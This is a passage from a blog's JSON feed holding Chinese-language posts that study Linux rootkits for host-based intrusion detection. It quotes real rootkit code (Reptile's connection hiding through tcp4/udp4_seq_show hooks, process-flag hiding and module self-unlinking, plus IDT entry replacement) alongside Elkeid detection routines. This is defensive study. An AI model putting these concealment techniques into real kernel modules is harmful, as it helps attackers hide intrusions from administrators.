Allocating memory */#define PF_NPROC_EXCEEDED\t0x00001000\t/* set_user() noticed that RLIMIT_NPROC was exceeded */#define PF_USED_MATH\t\t0x00002000\t/* If unset the fpu must be initialized before use */#define PF_NOFREEZE\t\t0x00008000\t/* This thread should not be frozen */#define PF_FROZEN\t\t0x00010000\t/* Frozen for system suspend */#define PF_KSWAPD\t\t0x00020000\t/* I am kswapd */#define PF_MEMALLOC_NOFS\t0x00040000\t/* All allocation requests will inherit GFP_NOFS */#define PF_MEMALLOC_NOIO\t0x00080000\t/* All allocation requests will inherit GFP_NOIO */#define PF_LOCAL_THROTTLE\t0x00100000\t/* Throttle writes only against the bdi I write to,\t\t\t\t\t\t * I am cleaning dirty pages from some other bdi. */#define PF_KTHREAD\t\t0x00200000\t/* I am a kernel thread */#define PF_RANDOMIZE\t\t0x00400000\t/* Randomize virtual address space */#define PF_SWAPWRITE\t\t0x00800000\t/* Allowed to write to swap */#define PF_NO_SETAFFINITY\t0x04000000\t/* Userland is not allowed to meddle with cpus_mask */#define PF_MCE_EARLY\t\t0x08000000      /* Early kill for mce process policy */#define PF_MEMALLOC_PIN\t\t0x10000000\t/* Allocation context constrained to zones which allow long term pinning. */#define PF_FREEZER_SKIP\t\t0x40000000\t/* Freezer should not count it as freezable */#define PF_SUSPEND_TASK\t\t0x80000000      /* This thread called freeze_processes() and should not be frozen */在 Reptile 中，判断是否为 PF_SUSPEND_TASK. 在其他项目中，我们也能看到为 0x10000000 即 PF_MEMALLOC_PINnet 隐藏文件地址main.c在 main.c 中代码如下：/* ------------------------ HIDE CONNECTIONS ------------------------- */#ifdef CONFIG_HIDE_CONN#include &lt;net/inet_sock.h&gt;#include &lt;linux/seq_file.h&gt;#include \"network.h\"LIST_HEAD(hidden_conn_list);KHOOK_EXT(int, tcp4_seq_show, struct seq_file *, void *);static int khook_tcp4_seq_show(struct seq_file *seq, void *v){\tint ret;\tstruct sock *sk = v;\tstruct inet_sock *inet;\tstruct hidden_conn *hc;\tunsigned int daddr;\t//unsigned short dport;\tif (v == SEQ_START_TOKEN) {\t\tgoto origin;\t}\tinet = (struct inet_sock *)sk;#if LINUX_VERSION_CODE &gt;= KERNEL_VERSION(2, 6, 33)\tdaddr = inet-&gt;inet_daddr;\t//dport = inet-&gt;inet_dport;#else\tdaddr = inet-&gt;daddr;\t//dport = inet-&gt;dport;#endif\tlist_for_each_entry(hc, &amp;hidden_conn_list, list)\t{\t\tif (hc-&gt;addr.sin_addr.s_addr == daddr /* &amp;&amp; hc-&gt;addr.sin_port == dport */) {\t\t\tret = 0;\t\t\tgoto out;\t\t}\t}origin:\tret = KHOOK_ORIGIN(tcp4_seq_show, seq, v);out:\treturn ret;}KHOOK_EXT(int, udp4_seq_show, struct seq_file *, void *);static int khook_udp4_seq_show(struct seq_file *seq, void *v){\tint ret;\tstruct sock *sk = v;\tstruct inet_sock *inet;\tstruct hidden_conn *hc;\tunsigned int daddr;\t//unsigned short dport;\tif (v == SEQ_START_TOKEN) {\t\tgoto origin;\t}\tinet = (struct inet_sock *)sk;#if LINUX_VERSION_CODE &gt;= KERNEL_VERSION(2, 6, 33)\tdaddr = inet-&gt;inet_daddr;\t//dport = inet-&gt;inet_dport;#else\tdaddr = inet-&gt;daddr;\t//dport = inet-&gt;dport;#endif\tlist_for_each_entry(hc, &amp;hidden_conn_list, list)\t{\t\tif (hc-&gt;addr.sin_addr.s_addr == daddr /* &amp;&amp; hc-&gt;addr.sin_port == dport */) {\t\t\tret = 0;\t\t\tgoto out;\t\t}\t}origin:\tret = KHOOK_ORIGIN(udp4_seq_show, seq, v);out:\treturn ret;}#endif简单来说就是 hook 掉 tcp4_seq_show/udp4_seq_show 这两个展示网络接口。在函数 khook_inet_ioctl 分支 4 获取来判断是否隐藏module 隐藏首先 module 的获取是, /proc/modules 以及 lsmod ，在 Reptile 中是将自身从内核模块链表中删除。代码很简单，具体原理放后面再深入void hide(void){\twhile (!mutex_trylock(&amp;module_mutex))\t\tcpu_relax();\tmod_list = THIS_MODULE-&gt;list.prev;\tlist_del(&amp;THIS_MODULE-&gt;list);\tkfree(THIS_MODULE-&gt;sect_attrs);\tTHIS_MODULE-&gt;sect_attrs = NULL;\tmutex_unlock(&amp;module_mutex);\t\thide_m = 1;}Unfishied  稍微流水账的记录了一下… 因为急于看 cilium 的 tetragon…",
            "content_html": "<h2 id=\"背景\">背景</h2><p>一个良好的 Rootkit 除了有敲门，Hook以外，隐藏网络/进程/内核模块也是十分重要的，同时对于我们分析是否存在内核后门，也非常重要</p><p>以下部分代码基于 <a href=\"https://github.com/f0rb1dd3n/Reptile\">Reptile</a></p><h2 id=\"proc-隐藏\">proc 隐藏</h2><p><a href=\"https://github.com/f0rb1dd3n/Reptile/blob/master/kernel/proc.c\">代码地址</a></p><h3 id=\"判断可见\">判断可见</h3><p>首先是入口地址，判断进程是否可见，再调用 <code class=\"language-plaintext highlighter-rouge\">flag_tasks</code> 设置</p><pre><code class=\"language-C\">void hide_proc(pid_t pid){\tif (is_proc_invisible(pid))\t\tflag_tasks(pid, 0);\telse\t\tflag_tasks(pid, 1);}</code></pre><p>先看一下 <code class=\"language-plaintext highlighter-rouge\">is_proc_invisible</code> 函数</p><pre><code class=\"language-C\">int is_proc_invisible(pid_t pid){\tstruct task_struct *task;\tint ret = 0;\tif (!pid)\t\treturn ret;\ttask = find_task(pid);\tif (!task)\t\treturn ret;\tif (is_task_invisible(task))\t\tret = 1;\tput_task_struct(task);\treturn ret;}...#define FLAG 0x80000000static inline int is_task_invisible(struct task_struct *task){\treturn task-&gt;flags &amp; FLAG;}</code></pre><p>主要判断 <code class=\"language-plaintext highlighter-rouge\">task-&gt;flags</code> 一切围绕着这个展开，包括下面的进程隐藏。我对于 linux 内核并不熟悉，搜索学习了一下如下：</p><h3 id=\"进程标记\">进程标记</h3><p><code class=\"language-plaintext highlighter-rouge\">task_struct</code> 这个结构体，在 <code class=\"language-plaintext highlighter-rouge\">linux/sched.h</code> 下，<a href=\"https://elixir.bootlin.com/linux/latest/source/include/linux/sched.h#L728\">elixir</a></p><p>对应的 <code class=\"language-plaintext highlighter-rouge\">flags</code> 标识位如下所示:</p><pre><code class=\"language-C\">/* * Per process flags */#define PF_VCPU\t\t\t0x00000001\t/* I'm a virtual CPU */#define PF_IDLE\t\t\t0x00000002\t/* I am an IDLE thread */#define PF_EXITING\t\t0x00000004\t/* Getting shut down */#define PF_POSTCOREDUMP\t\t0x00000008\t/* Coredumps should ignore this task */#define PF_IO_WORKER\t\t0x00000010\t/* Task is an IO worker */#define PF_WQ_WORKER\t\t0x00000020\t/* I'm a workqueue worker */#define PF_FORKNOEXEC\t\t0x00000040\t/* Forked but didn't exec */#define PF_MCE_PROCESS\t\t0x00000080      /* Process policy on mce errors */#define PF_SUPERPRIV\t\t0x00000100\t/* Used super-user privileges */#define PF_DUMPCORE\t\t0x00000200\t/* Dumped core */#define PF_SIGNALED\t\t0x00000400\t/* Killed by a signal */#define PF_MEMALLOC\t\t0x00000800\t/* Allocating memory */#define PF_NPROC_EXCEEDED\t0x00001000\t/* set_user() noticed that RLIMIT_NPROC was exceeded */#define PF_USED_MATH\t\t0x00002000\t/* If unset the fpu must be initialized before use */#define PF_NOFREEZE\t\t0x00008000\t/* This thread should not be frozen */#define PF_FROZEN\t\t0x00010000\t/* Frozen for system suspend */#define PF_KSWAPD\t\t0x00020000\t/* I am kswapd */#define PF_MEMALLOC_NOFS\t0x00040000\t/* All allocation requests will inherit GFP_NOFS */#define PF_MEMALLOC_NOIO\t0x00080000\t/* All allocation requests will inherit GFP_NOIO */#define PF_LOCAL_THROTTLE\t0x00100000\t/* Throttle writes only against the bdi I write to,\t\t\t\t\t\t * I am cleaning dirty pages from some other bdi. */#define PF_KTHREAD\t\t0x00200000\t/* I am a kernel thread */#define PF_RANDOMIZE\t\t0x00400000\t/* Randomize virtual address space */#define PF_SWAPWRITE\t\t0x00800000\t/* Allowed to write to swap */#define PF_NO_SETAFFINITY\t0x04000000\t/* Userland is not allowed to meddle with cpus_mask */#define PF_MCE_EARLY\t\t0x08000000      /* Early kill for mce process policy */#define PF_MEMALLOC_PIN\t\t0x10000000\t/* Allocation context constrained to zones which allow long term pinning. */#define PF_FREEZER_SKIP\t\t0x40000000\t/* Freezer should not count it as freezable */#define PF_SUSPEND_TASK\t\t0x80000000      /* This thread called freeze_processes() and should not be frozen */</code></pre><p>在 <code class=\"language-plaintext highlighter-rouge\">Reptile</code> 中，判断是否为 <code class=\"language-plaintext highlighter-rouge\">PF_SUSPEND_TASK</code>. 在<a href=\"https://github.com/seal9055/cyber_attack_simulation/blob/7aff159017ce013fca6b59dd687e221251d57100/rootkit/rootkit.c\">其他项目</a>中，我们也能看到为 <code class=\"language-plaintext highlighter-rouge\">0x10000000</code> 即 <code class=\"language-plaintext highlighter-rouge\">PF_MEMALLOC_PIN</code></p><h2 id=\"net-隐藏\">net 隐藏</h2><p><a href=\"https://github.com/f0rb1dd3n/Reptile/blob/1e17bc82ea8e4f9b4eaf15619ed6bcd283ad0e17/kernel/network.c\">文件地址</a><a href=\"https://github.com/f0rb1dd3n/Reptile/blob/1e17bc82ea8e4f9b4eaf15619ed6bcd283ad0e17/kernel/main.c\">main.c</a></p><p>在 <code class=\"language-plaintext highlighter-rouge\">main.c</code> 中代码如下：</p><pre><code class=\"language-C\">/* ------------------------ HIDE CONNECTIONS ------------------------- */#ifdef CONFIG_HIDE_CONN#include &lt;net/inet_sock.h&gt;#include &lt;linux/seq_file.h&gt;#include \"network.h\"LIST_HEAD(hidden_conn_list);KHOOK_EXT(int, tcp4_seq_show, struct seq_file *, void *);static int khook_tcp4_seq_show(struct seq_file *seq, void *v){\tint ret;\tstruct sock *sk = v;\tstruct inet_sock *inet;\tstruct hidden_conn *hc;\tunsigned int daddr;\t//unsigned short dport;\tif (v == SEQ_START_TOKEN) {\t\tgoto origin;\t}\tinet = (struct inet_sock *)sk;#if LINUX_VERSION_CODE &gt;= KERNEL_VERSION(2, 6, 33)\tdaddr = inet-&gt;inet_daddr;\t//dport = inet-&gt;inet_dport;#else\tdaddr = inet-&gt;daddr;\t//dport = inet-&gt;dport;#endif\tlist_for_each_entry(hc, &amp;hidden_conn_list, list)\t{\t\tif (hc-&gt;addr.sin_addr.s_addr == daddr /* &amp;&amp; hc-&gt;addr.sin_port == dport */) {\t\t\tret = 0;\t\t\tgoto out;\t\t}\t}origin:\tret = KHOOK_ORIGIN(tcp4_seq_show, seq, v);out:\treturn ret;}KHOOK_EXT(int, udp4_seq_show, struct seq_file *, void *);static int khook_udp4_seq_show(struct seq_file *seq, void *v){\tint ret;\tstruct sock *sk = v;\tstruct inet_sock *inet;\tstruct hidden_conn *hc;\tunsigned int daddr;\t//unsigned short dport;\tif (v == SEQ_START_TOKEN) {\t\tgoto origin;\t}\tinet = (struct inet_sock *)sk;#if LINUX_VERSION_CODE &gt;= KERNEL_VERSION(2, 6, 33)\tdaddr = inet-&gt;inet_daddr;\t//dport = inet-&gt;inet_dport;#else\tdaddr = inet-&gt;daddr;\t//dport = inet-&gt;dport;#endif\tlist_for_each_entry(hc, &amp;hidden_conn_list, list)\t{\t\tif (hc-&gt;addr.sin_addr.s_addr == daddr /* &amp;&amp; hc-&gt;addr.sin_port == dport */) {\t\t\tret = 0;\t\t\tgoto out;\t\t}\t}origin:\tret = KHOOK_ORIGIN(udp4_seq_show, seq, v);out:\treturn ret;}#endif</code></pre><p>简单来说就是 hook 掉 <code class=\"language-plaintext highlighter-rouge\">tcp4_seq_show/udp4_seq_show</code> 这两个展示网络接口。在函数 <code class=\"language-plaintext highlighter-rouge\">khook_inet_ioctl</code> 分支 4 获取来判断是否隐藏</p><h3 id=\"module-隐藏\">module 隐藏</h3><p>首先 module 的获取是, <code class=\"language-plaintext highlighter-rouge\">/proc/modules</code> 以及 <code class=\"language-plaintext highlighter-rouge\">lsmod</code> ，在 <code class=\"language-plaintext highlighter-rouge\">Reptile</code> 中是将自身从内核模块链表中删除。代码很简单，具体原理放后面再深入</p><pre><code class=\"language-C\">void hide(void){\twhile (!mutex_trylock(&amp;module_mutex))\t\tcpu_relax();\tmod_list = THIS_MODULE-&gt;list.prev;\tlist_del(&amp;THIS_MODULE-&gt;list);\tkfree(THIS_MODULE-&gt;sect_attrs);\tTHIS_MODULE-&gt;sect_attrs = NULL;\tmutex_unlock(&amp;module_mutex);\t\thide_m = 1;}</code></pre><h3 id=\"unfishied\">Unfishied</h3><blockquote>  <p>稍微流水账的记录了一下… 因为急于看 cilium 的 tetragon…</p></blockquote>",
            "url": "https://chriskalix.github.io/2022/05/18/linux-rootkit%E5%88%9D%E7%AA%A5-%E4%B8%89-rootkit%E9%9A%90%E8%97%8F",
            
            
            
            
            
            "date_published": "2022-05-18T00:00:00+02:00",
            "date_modified": "2022-05-18T00:00:00+02:00",
            
                "author":  {
                "name": "chriskali",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://chriskalix.github.io/2022/03/21/linux-rootkit%E5%88%9D%E7%AA%A5-%E4%BA%8C-sys-call-table",
            "title": "Linux Rootkit初窥(二)sys_call_table",
            "summary": "Linux Rootkit初窥(二)sys_call_table",
            "content_text": "背景书接上回，我们对 sys_call_table 继续探究，开篇之前还是先贴一下这个图片。以下代码基于 Kernel Version 4.18基础知识首先我们了解一下，sys_call_table 在 Linux Source Code 中是怎么样的。在 arch/x86/entry/syscall_64.c 中如下extern asmlinkage long sys_ni_syscall(const struct pt_regs *);#define __SYSCALL_64(nr, sym, qual) extern asmlinkage long sym(const struct pt_regs *);#include &lt;asm/syscalls_64.h&gt;#undef __SYSCALL_64#define __SYSCALL_64(nr, sym, qual) [nr] = sym,asmlinkage const sys_call_ptr_t sys_call_table[__NR_syscall_max+1] = {    /*     * Smells like a compiler bug -- it doesn't work     * when the &amp; below is removed.     */    [0 ... __NR_syscall_max] = &amp;sys_ni_syscall,#include &lt;asm/syscalls_64.h&gt;};用户态程序调用后进入到 Syscall 陷入中断，在 sys_call_table 中寻找对应处理程序。对于 sys_call_table 地址的获取在 Kernel Version 2.6 之后做了隐藏，可以参考这个文章。由于不讨论 Rootkit 具体细节（其实我还没看），仅从检测角度来说在 Elkeid 里的代码和 IDT 检测一样static void analyze_syscalls(void){    int i;    unsigned long addr;    struct module *mod;    if (!sct || !ckt)        return;            for (i = 0; i &lt; NR_syscalls; i++) {        const char *mod_name = \"-1\";        addr = sct[i];                if (!ckt(addr)) {            module_list_lock();            mod = get_module_from_addr(addr);            if (mod) {                mod_name = mod-&gt;name;            } else {                const char* name = find_hidden_module(addr);                if (IS_ERR_OR_NULL(name)) {                module_list_unlock();                continue;                }                mod_name = name;            }                        syscall_print(mod_name, i);            module_list_unlock();        }    }}通过遍历 kobj 判断是否在 kset 里面来判断是否是一个 hidden module。文章暂时属于未完成的状态，后续会有做 Rootkit 的部分在这里补全题外话今天公司的用户态 HIDS 上抓了一个入侵，很兴奋，很少抓到入侵:入侵的流程很简单，由于管理疏忽有一个 PHP 的应用存在 RCE，父进程为 php-fpm 的进程执行了 sh 触发了警告，后续就是问题处置让我更加明白了，用户态的代码可能和内核态的一样重要。对于绝大部分入侵场景来说，大部分都是在用户态层面的对抗。真正内核态的，可能是占较少部分。所以我一直认为，好的数据采集源是成功的50%，另外的50%在分析",
            "content_html": "<h2 id=\"背景\">背景</h2><p>书接上回，我们对 sys_call_table 继续探究，开篇之前还是先贴一下这个图片。以下代码基于 Kernel Version 4.18</p><p><img src=\"https://chriskaliX.github.io/assets/imgs/callgraph.jpg\" alt=\"简书\" /></p><h2 id=\"基础知识\">基础知识</h2><p>首先我们了解一下，sys_call_table 在 Linux Source Code 中是怎么样的。在 <code class=\"language-plaintext highlighter-rouge\">arch/x86/entry/syscall_64.c</code> 中如下</p><pre><code class=\"language-C\">extern asmlinkage long sys_ni_syscall(const struct pt_regs *);#define __SYSCALL_64(nr, sym, qual) extern asmlinkage long sym(const struct pt_regs *);#include &lt;asm/syscalls_64.h&gt;#undef __SYSCALL_64#define __SYSCALL_64(nr, sym, qual) [nr] = sym,asmlinkage const sys_call_ptr_t sys_call_table[__NR_syscall_max+1] = {    /*     * Smells like a compiler bug -- it doesn't work     * when the &amp; below is removed.     */    [0 ... __NR_syscall_max] = &amp;sys_ni_syscall,#include &lt;asm/syscalls_64.h&gt;};</code></pre><p>用户态程序调用后进入到 Syscall 陷入中断，在 <code class=\"language-plaintext highlighter-rouge\">sys_call_table</code> 中寻找对应处理程序。对于 <code class=\"language-plaintext highlighter-rouge\">sys_call_table</code> 地址的获取在 Kernel Version 2.6 之后做了隐藏，可以参考这个<a href=\"https://tnichols.org/2015/10/19/Hooking-the-Linux-System-Call-Table/\">文章</a>。</p><p>由于不讨论 Rootkit 具体细节（其实我还没看），仅从检测角度来说在 Elkeid 里的代码和 IDT 检测一样</p><pre><code class=\"language-C\">static void analyze_syscalls(void){    int i;    unsigned long addr;    struct module *mod;    if (!sct || !ckt)        return;            for (i = 0; i &lt; NR_syscalls; i++) {        const char *mod_name = \"-1\";        addr = sct[i];                if (!ckt(addr)) {            module_list_lock();            mod = get_module_from_addr(addr);            if (mod) {                mod_name = mod-&gt;name;            } else {                const char* name = find_hidden_module(addr);                if (IS_ERR_OR_NULL(name)) {                module_list_unlock();                continue;                }                mod_name = name;            }                        syscall_print(mod_name, i);            module_list_unlock();        }    }}</code></pre><p>通过遍历 kobj 判断是否在 kset 里面来判断是否是一个 hidden module。文章暂时属于未完成的状态，后续会有做 Rootkit 的部分在这里补全</p><h2 id=\"题外话\">题外话</h2><p>今天公司的用户态 HIDS 上抓了一个入侵，很兴奋，很少抓到入侵:</p><p>入侵的流程很简单，由于管理疏忽有一个 PHP 的应用存在 RCE，父进程为 php-fpm 的进程执行了 sh 触发了警告，后续就是问题处置</p><p>让我更加明白了，用户态的代码可能和内核态的一样重要。对于绝大部分入侵场景来说，大部分都是在用户态层面的对抗。真正内核态的，可能是占较少部分。所以我一直认为，好的数据采集源是成功的50%，另外的50%在分析</p>",
            "url": "https://chriskalix.github.io/2022/03/21/linux-rootkit%E5%88%9D%E7%AA%A5-%E4%BA%8C-sys-call-table",
            
            
            
            
            
            "date_published": "2022-03-21T00:00:00+01:00",
            "date_modified": "2022-03-21T00:00:00+01:00",
            
                "author":  {
                "name": "chriskali",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://chriskalix.github.io/2022/03/19/linux-rootkit%E5%88%9D%E7%AA%A5-%E4%B8%80-idt",
            "title": "Linux Rootkit初窥(一)IDT",
            "summary": "Linux Rootkit初窥(一)IDT",
            "content_text": "背景近期在编写 HIDS 相关项目 - Hades，对于用户态的后门或者行为，由于使用了 eBPF 进行内核态的函数 Hook，我们能够发现大部分的行为。只要 Hook 的够全面，几乎能检测到用户层 Rootkit 的一举一动。目前 Hades 项目完成了十余个 hook，覆盖了执行、网络等，后续补全文件侧以及常用的 uprobes，对于用户态后门、入侵行为等能有较全的感知。然而对于 Rootkit，由于笔者知识匮乏，除了 hook do_init_module 和针对 eBPF 程序加载（ebpfkit-monitor）做监测，也不知道如何防范，抓取这样的行为…作为知识的补充，本篇文章涵盖 Rootkit/Linux 基础学习以及一些思考基础知识  由于之前对这部分一窍不通，好多的基础知识我们当作实验，稍微的过一遍。从知乎的回答中我们找到 phrack.org，开始学习。参考 Handling Interrupt Descriptor Table for fun and profit，很大一部分可能会是翻译，翻译的过程就是学习的过程首先，Intel CPU 在保护模式，提供四种模式，即 r0 ~ r3 层，用户层的应用程序一般运行在 r3 层，内核态的运行在 r0 层中断分为可屏蔽和不可屏蔽中断，其中不可屏蔽中断在这里不讨论。中断向量是个0~255之间的数，其中 0~31 是 exceptions 以及不可屏蔽中断， 32~47 是可屏蔽中断，48~255 为软件中断。Linux 下通常使用的是 (0x80) sys_call_table，即用户态通过 syscall 调用到内核函数。同样的，当我们为了获取 sys_call_table 地址也可以从 IDT 中获取什么是 IDT ?  IDT 即 Interrupt Descriptor Table。是一个描述中断即其对应处理函数的线性表，包含四种不同类型的描述/类型。分别是 Task Gate Descriptor（Linux 不使用这种） / Interrupt Gate Descriptor / Trap Gate Descriptor / Call Gate Descriptorenum {    GATE_INTERRUPT = 0xE,    GATE_TRAP = 0xF,    GATE_CALL = 0xC,    GATE_TASK = 0x5,};其中 Interrupt Gate Descriptor 用于中断的处理，需要关注的是 DPL（Descriptor Privilege Level）为0，因此用户态不能访问中断门为了方便理解，借用一个图(这图很经典，方便了解整个流程)：in Linux在 Linux 中，IDT 的定义在 arch/x86/kernel/idt.c ，IDT_ENTRIES 固定为 256gate_desc idt_table[IDT_ENTRIES] __page_aligned_bss;其中 gate_desc 定义如下struct gate_struct {    u16     offset_low;    u16     segment;    struct idt_bits bits;    u16     offset_middle;#ifdef CONFIG_X86_64    u32     offset_high;    u32     reserved;#endif} __attribute__((packed));其中 offset_* 代表中断函数的偏移量，bits 为属性符从项目出发从开始，我们便以字节的 Elkeid 作为参考。Elkeid 主要检查了 4 个，即隐藏内核模块/进程隐藏/IDT劫持/系统调用劫持。我们以 idt rootkit 为关键字，搜索到一些项目。在 idt.c 中，通过替换 IDT 中的函数地址实现 Hook，关键代码如下：void idt_set_entry(unsigned long addr, int n){    if (cur_idt_table == old_idt_table)        set_addr_rw(old_idt_table);    cur_idt_table[n].offset_high = (addr &gt;&gt; 32) &amp; 0xffffffff;    cur_idt_table[n].offset_middle = (addr &gt;&gt; 16) &amp; 0xffff;    cur_idt_table[n].offset_low = addr &amp; 0xffff;    if (cur_idt_table == old_idt_table)        set_addr_ro(old_idt_table);}void idt_substitute(void){    struct desc_ptr idtr;    memcpy(new_idt_table, cur_idt_table, IDT_SZ);    idtr.address = (unsigned long)new_idt_table;    idtr.size = idt_size;    on_each_cpu(local_load_idt, &amp;idtr, 1);    cur_idt_table = new_idt_table;}替换表的形式来完成劫持，其中对 IDTR 寄存器的操作使用 LIDT 指令和 SIDT 指令。另外 sys_call_table 的 hook 应该方法也是类似，先在 IDT 表中找到 0x80 中断的位置，再根据特定 function 再 sys_call_table 中的偏移…顺便贴一张 IDTR在字节的 anti_rootkit 中我们截取 interrupt 检查部分，事实上 sys_call_table 的检查部分也是一样的static void analyze_interrupts(void){#ifdef CONFIG_X86    int i;    unsigned long addr;    struct module *mod;    if (!idt || !ckt)        return;    // 遍历所有 entries    for (i = 0; i &lt; IDT_ENTRIES; i++) {        const char *mod_name = \"-1\";         addr = idt[i];        // ckt 判断是否为内核代码段        if (!ckt(addr)) {            module_list_lock();            // 获取 idt 对应函数的地址            mod = get_module_from_addr(addr);            if (mod) {                mod_name = mod-&gt;name;            } else {                // 寻找是否为隐藏的内核模块                // 通过遍历 ksets 下的 mod list，通过于 kobj 一一比对                // 如果找不到，则为隐藏的内核模块，是可疑的                const char *name = find_hidden_module(addr);                if (IS_ERR_OR_NULL(name)) {                    module_list_unlock();                    continue;                }                mod_name = name;            }            interrupts_print(mod_name, i);            module_list_unlock();        }    }#endif}这种检测，对函数的 entry 做了足够的检测，但是如何检测 hook 在函数中间的情况呢?最后其实看的还是比较浅显的，如果每个模块都单独细钻，会耗费较大的时间，后续会慢慢跟进参考  有字节群中沈平推荐的两本，可以细细品读，我还没看…1, The Rootkit Arsenal Escape and Evasion in the Dark Corners of the System by Bill Blunden， 2nd edition，第一版是中译本2, Rootkits and Bootkits Reversing Modern Malware and Next Generation Threats by Alex Matrosov, Eugene Rodionov, Sergey Bratus，有中译本3, nskernel-kernel-play-guide",
            "content_html": "<h2 id=\"背景\">背景</h2><p>近期在编写 HIDS 相关项目 - <a href=\"https://github.com/chriskaliX/Hades\">Hades</a>，对于用户态的后门或者行为，由于使用了 <code class=\"language-plaintext highlighter-rouge\">eBPF</code> 进行内核态的函数 Hook，我们能够发现大部分的行为。只要 Hook 的够全面，几乎能检测到用户层 <code class=\"language-plaintext highlighter-rouge\">Rootkit</code> 的一举一动。目前 <code class=\"language-plaintext highlighter-rouge\">Hades</code> 项目完成了十余个 hook，覆盖了执行、网络等，后续补全文件侧以及常用的 <code class=\"language-plaintext highlighter-rouge\">uprobes</code>，对于用户态后门、入侵行为等能有较全的感知。然而对于 <code class=\"language-plaintext highlighter-rouge\">Rootkit</code>，由于笔者知识匮乏，除了 hook <code class=\"language-plaintext highlighter-rouge\">do_init_module</code> 和针对 eBPF 程序加载（<a href=\"https://github.com/Gui774ume/ebpfkit-monitor\">ebpfkit-monitor</a>）做监测，也不知道如何防范，抓取这样的行为…作为知识的补充，本篇文章涵盖 Rootkit/Linux 基础学习以及一些思考</p><h3 id=\"基础知识\">基础知识</h3><blockquote>  <p>由于之前对这部分一窍不通，好多的基础知识我们当作实验，稍微的过一遍。从知乎的<a href=\"https://www.zhihu.com/question/33695415\">回答</a>中我们找到 phrack.org，开始学习。参考 <a href=\"http://phrack.org/issues/59/4.html\">Handling Interrupt Descriptor Table for fun and profit</a>，很大一部分可能会是翻译，翻译的过程就是学习的过程</p></blockquote><p>首先，Intel CPU 在保护模式，提供四种模式，即 r0 ~ r3 层，用户层的应用程序一般运行在 r3 层，内核态的运行在 r0 层</p><p>中断分为可屏蔽和不可屏蔽中断，其中不可屏蔽中断在这里不讨论。中断向量是个0~255之间的数，其中 0~31 是 exceptions 以及不可屏蔽中断， 32~47 是可屏蔽中断，48~255 为软件中断。Linux 下通常使用的是 (0x80) sys_call_table，即用户态通过 syscall 调用到内核函数。同样的，当我们为了获取 <code class=\"language-plaintext highlighter-rouge\">sys_call_table</code> 地址也可以从 <code class=\"language-plaintext highlighter-rouge\">IDT</code> 中获取</p><p>什么是 <code class=\"language-plaintext highlighter-rouge\">IDT</code> ?  <code class=\"language-plaintext highlighter-rouge\">IDT</code> 即 Interrupt Descriptor Table。是一个描述中断即其对应处理函数的线性表，包含四种不同类型的描述/类型。分别是 Task Gate Descriptor（Linux 不使用这种） / Interrupt Gate Descriptor / Trap Gate Descriptor / Call Gate Descriptor</p><div class=\"language-c highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">enum</span> <span class=\"p\">{</span>    <span class=\"n\">GATE_INTERRUPT</span> <span class=\"o\">=</span> <span class=\"mh\">0xE</span><span class=\"p\">,</span>    <span class=\"n\">GATE_TRAP</span> <span class=\"o\">=</span> <span class=\"mh\">0xF</span><span class=\"p\">,</span>    <span class=\"n\">GATE_CALL</span> <span class=\"o\">=</span> <span class=\"mh\">0xC</span><span class=\"p\">,</span>    <span class=\"n\">GATE_TASK</span> <span class=\"o\">=</span> <span class=\"mh\">0x5</span><span class=\"p\">,</span><span class=\"p\">};</span></code></pre></div></div><p>其中 Interrupt Gate Descriptor 用于中断的处理，需要关注的是 DPL（Descriptor Privilege Level）为0，因此用户态不能访问中断门</p><p>为了方便理解，借用一个图(这图很经典，方便了解整个流程)：</p><p><img src=\"https://chriskaliX.github.io/assets/imgs/callgraph.jpg\" alt=\"简书\" /></p><h4 id=\"in-linux\">in Linux</h4><p>在 Linux 中，IDT 的定义在 <code class=\"language-plaintext highlighter-rouge\">arch/x86/kernel/idt.c</code> ，<code class=\"language-plaintext highlighter-rouge\">IDT_ENTRIES</code> 固定为 256</p><div class=\"language-c highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">gate_desc</span> <span class=\"n\">idt_table</span><span class=\"p\">[</span><span class=\"n\">IDT_ENTRIES</span><span class=\"p\">]</span> <span class=\"n\">__page_aligned_bss</span><span class=\"p\">;</span></code></pre></div></div><p>其中 <code class=\"language-plaintext highlighter-rouge\">gate_desc</code> 定义如下</p><div class=\"language-c highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">struct</span> <span class=\"n\">gate_struct</span> <span class=\"p\">{</span>    <span class=\"n\">u16</span>     <span class=\"n\">offset_low</span><span class=\"p\">;</span>    <span class=\"n\">u16</span>     <span class=\"n\">segment</span><span class=\"p\">;</span>    <span class=\"k\">struct</span> <span class=\"n\">idt_bits</span> <span class=\"n\">bits</span><span class=\"p\">;</span>    <span class=\"n\">u16</span>     <span class=\"n\">offset_middle</span><span class=\"p\">;</span><span class=\"cp\">#ifdef CONFIG_X86_64</span>    <span class=\"n\">u32</span>     <span class=\"n\">offset_high</span><span class=\"p\">;</span>    <span class=\"n\">u32</span>     <span class=\"n\">reserved</span><span class=\"p\">;</span><span class=\"cp\">#endif</span><span class=\"p\">}</span> <span class=\"n\">__attribute__</span><span class=\"p\">((</span><span class=\"n\">packed</span><span class=\"p\">));</span></code></pre></div></div><p>其中 offset_* 代表中断函数的偏移量，bits 为属性符</p><h3 id=\"从项目出发\">从项目出发</h3><p>从开始，我们便以字节的 Elkeid 作为参考。Elkeid 主要检查了 4 个，即隐藏内核模块/进程隐藏/IDT劫持/系统调用劫持。我们以 idt rootkit 为关键字，搜索到一些<a href=\"https://github.com/kaneschutzman/linux-rootkit\">项目</a>。在 <a href=\"https://github.com/kaneschutzman/linux-rootkit/blob/5dcb228a86f67773d6e2b92276e59cf030b52c23/src/idt.c\">idt.c</a> 中，通过替换 <code class=\"language-plaintext highlighter-rouge\">IDT</code> 中的函数地址实现 Hook，关键代码如下：</p><div class=\"language-c highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"kt\">void</span> <span class=\"nf\">idt_set_entry</span><span class=\"p\">(</span><span class=\"kt\">unsigned</span> <span class=\"kt\">long</span> <span class=\"n\">addr</span><span class=\"p\">,</span> <span class=\"kt\">int</span> <span class=\"n\">n</span><span class=\"p\">)</span><span class=\"p\">{</span>    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">cur_idt_table</span> <span class=\"o\">==</span> <span class=\"n\">old_idt_table</span><span class=\"p\">)</span>        <span 